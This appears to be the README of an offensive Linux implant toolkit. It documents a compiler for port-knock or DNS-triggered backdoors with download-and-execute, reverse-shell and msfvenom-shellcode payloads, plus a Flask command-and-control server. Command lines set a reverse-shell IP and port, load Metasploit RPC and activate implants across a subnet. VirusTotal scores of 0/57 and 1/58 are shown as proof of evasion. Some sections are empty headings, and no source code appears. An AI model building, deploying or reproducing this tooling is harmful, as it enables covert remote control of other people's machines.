# Unnamed Implant Documentation




## Features

## Software Requirements 


### Dependencies:

Required:


To Build x86:


To Load Shellcode:


For Reverse Shell:


## Files

### C Implant

* compiler.py is a basic python framework which allows easy compilation and logging of all implants, similar to the functionality of Veil-Evasion for linux devices

* checker.c and listener.c are the main programs which contain the implant
* attacks.c contains implementations of the attacks
* attacks.h is a header
* dynamic.h is a header file dynamically generated by compiler.py that defines values for the actual compiler

* log.csv is log created during compilation, containing information about all backdoors created.
* activate.py is a python script that parses the logfile, sets up listeners, and activates specified IPs inside of a subnet

### C2 Server 

* servery.py is a flask based HTTP server which responds to requests with C2 information and logs results
* terminal.py is a shell that allows for somewhat easy configuration of C2 
* client.py is a python implementation of the client functionality
* client.c is a shell that eventually will contain the implementation of the C2 server for inclusion with the implant

## Notes 
-d adds debugging comments for the C code, very useful.

If testing locally, change -intfc to 'lo'. 

# Usage

## Compilation 

### Listener with a List of Ports to Port Knock
compiler.py -o implant -p listener -intfc eth0 -act SECRET_PORTS -key 200,300,400 

### Listener with Port Knock Counter
compiler.py -o implant -p listener -intfc eth0 -act SECRET_NUMBER -size 3 -key 1000 

### Checker with Specified Domain
compiler.py -o implant -p checkDNS -delayT 10 -trig "https://target.url" 

## Attacks
### Bang 
-atkB 
Creates a file named bang.txt and if debug is turned on, prints "bang"

### Download and Execute
-atkd 
Downloads a file from a URL specified at compile time and executes it

### Reverse Shell
-atkR -revip _ip_addr_ -revport _port_num_ 
Sends a reverse shell back to a listener specified at compile time.

## Shellcode
-atkSc -a x64 -p linux -ip _host_ip -revip _ip_addr_ -revport _port_num_ 

Shellcode is dynamically generated from msfvenom, parsed, and entered into dynamic.h for inclusion in compiled binary

# Example Usage 

```bash
compiler.py -o implant -p listener -intfc eth0 -act SECRET_PORTS -key 200,300,400 -atkSc -a x64 -p linux -ip 192.168.199.230 -revip 199.168.199.101 -revport 1337
sudo ./implant
```

```bash
msfconsole 
msf > load msgrpc Pass=mypassword
```

```bash
activate.py 192.168.199.0/24
```

# Detection



## VT Detections:
[0/57 Stripped Binary](https://www.virustotal.com/gui/file/5524cd773324ce3b62c0a016d5a14b2bbc92532eb1c20113fb37cbc50cd37bf4)
[1/58 Unstripped Binary](https://www.virustotal.com/gui/file/af3ca3daedc2ebfe58630550dc7cfa2fb9f167326d74fdb6be61a0db30ba1fa4)





